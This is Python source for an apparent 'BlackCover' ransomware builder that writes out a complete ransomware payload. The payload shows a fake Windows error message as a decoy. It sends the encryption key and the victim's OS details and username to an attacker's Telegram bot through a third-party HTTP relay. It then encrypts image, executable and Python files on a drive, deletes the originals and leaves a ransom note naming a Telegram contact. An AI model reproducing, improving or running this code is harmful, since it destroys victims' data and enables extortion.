#------------------------------------------------------------------------------------------------------

import sys
import time
from modules import banner
from colorama import Fore

#------------------------------------------------------------------------------------------------------

def create():
    print(Fore.RED + "  [" + Fore.RED + "!" + Fore.RED + "]" + Fore.LIGHTWHITE_EX + " Welcome To The Ransomware Maker Part\n")
    print(Fore.RED + "  [" + Fore.RED + "!" + Fore.RED + "]" + Fore.LIGHTWHITE_EX + " Please Enter The Telegram bot Token && Your User ID && File Name\n")
    try:

        token = input(Fore.LIGHTWHITE_EX + "BlackCover ~# " + Fore.LIGHTCYAN_EX + "")
    except KeyboardInterrupt:
        print("")
        sys.exit()
    try:
        banner.banner()
        print(Fore.RED + "  [" + Fore.RED + "!" + Fore.RED + "]" + Fore.LIGHTWHITE_EX + " Place Enter Your Chat-ID | Get Chat ID On Bot :> @blackcoverbot \n")
        user_id = input(Fore.LIGHTWHITE_EX + "BlackCover ~# " + Fore.LIGHTCYAN_EX + "")


    except KeyboardInterrupt:
        print("")
        sys.exit()
    try:
        banner.banner()
        print(Fore.RED + "  [" + Fore.RED + "!" + Fore.RED + "]" + Fore.LIGHTWHITE_EX + " Place Enter Your File Name | Simple :> blackcover.py \n")
        name = input(Fore.LIGHTWHITE_EX + "BlackCover ~# " + Fore.LIGHTCYAN_EX + "")
    except KeyboardInterrupt:
        print("")
        sys.exit()


#------------------------------------------------------------------------------------------------------

    path = ('''

from cryptography.fernet import Fernet
from subprocess import check_output
from os import remove
import requests
import platform
import os
import getpass
import ctypes
from win10toast import ToastNotifier

#------------------------------------------------------------------------------------------------------

def errnot():
    toaster = ToastNotifier()
    toaster.show_toast("The All Of File Encrypted","Place Check The File /Desktop/Lock.txt",icon_path="../icon/hacked.ico")


def errmsg():
    messageBox = ctypes.windll.user32.MessageBoxW

    returnValue = messageBox(0,"This verison of this file is not compatible with the version of Windows you're running. Check your computer's system information to see whether you need an x86 (32-bit) or x64 (64-bit) verion of the program","ERROR",0x10 | 0x0)



def msg():
    path = os.path.expanduser("~")+"\\Onedrive\\Desktop"
    f = open(path+"\\Locked.txt","w")
    f.write("Id telegram : @BLACK_AMOOZ")
    f.close()

def drive_finer():
    #Start Generate Key
    key = Fernet.generate_key()
    Encrypt = Fernet(key)
    #End Generate Key
    #-------------------------
    hi = ("Key : "+str(key)+"------------"+"Os Name : "+platform.uname()[0]+"------------"+"Version : "+platform.uname()[2]+"------------"+"Username : "+getpass.getuser())
    #Start Send Key in Telegram Bot
    url = ("https://api.telegram.org/bot%s/sendmessage?chat_id=%s&text="+str(hi))

    payload = {"UrlBox":url,

            "AgentList":"Mozilla Firefox",
            "VersionsList":"HTTP/1.1",
            "MethodList":"POST"
        }

    req = requests.post("https://www.httpdebugger.com/tools/ViewHttpHeaders.aspx",payload)
    print(req)
    #End Send Key Telegram bot
    drive = ["H:"]
    target_drive = []
    cmd = check_output("fsutil fsinfo drives",shell=True)
    for i in drive:
        if i in str(cmd):
            target_drive.append(i)
    print(target_drive)

    pasvand = ["exe","png","jpg","jpeg","psd","py"]



    for d in target_drive:
        for p in pasvand:
            try:
                with open("log", 'w') as errlog:
                    cmd2 = check_output(d+" && dir /S /B *."+p,shell=True,stderr=errlog)
                    ddm2 = cmd2.decode()
                    for g in ddm2.split():
                            with open(g,"rb") as dirlist: 
                                data = dirlist.read()
                                enc_data = Encrypt.encrypt(data)
                                new_file = open(g+"[blackamooz]","wb")
                                new_file.write(enc_data)
                                dirlist.close()
                                new_file.close()
                                os.remove(g)
                                print(g+ " ----- >  "+"  [Encrypted} ")                                                   
            except:
                pass
errmsg()               
drive_finer()
msg()
errnot()

#------------------------------------------------------------------------------------------------------

'''%(token,user_id))

    f = open("render/"+name,"w")
    f.write(path)
    f.close()
    print(Fore.LIGHTCYAN_EX + "\n  {" + Fore.LIGHTWHITE_EX + "!" + Fore.LIGHTCYAN_EX + "}" + Fore.LIGHTRED_EX + "--Place Wite . . .")
    time.sleep(4)
    print(Fore.LIGHTCYAN_EX + "  {" + Fore.LIGHTWHITE_EX + "~" + Fore.LIGHTCYAN_EX + "}" + Fore.LIGHTRED_EX + "--Place Check Folder "+Fore.WHITE+"/Render")
    time.sleep(2)
    try:
        input(Fore.LIGHTCYAN_EX + "\n  [" + Fore.LIGHTWHITE_EX + "-" + Fore.LIGHTCYAN_EX + "]" + Fore.LIGHTWHITE_EX + "  Press Enter To Menu ... ")
    except:
        print("")
        sys.exit()

#------------------------------------------------------------------------------------------------------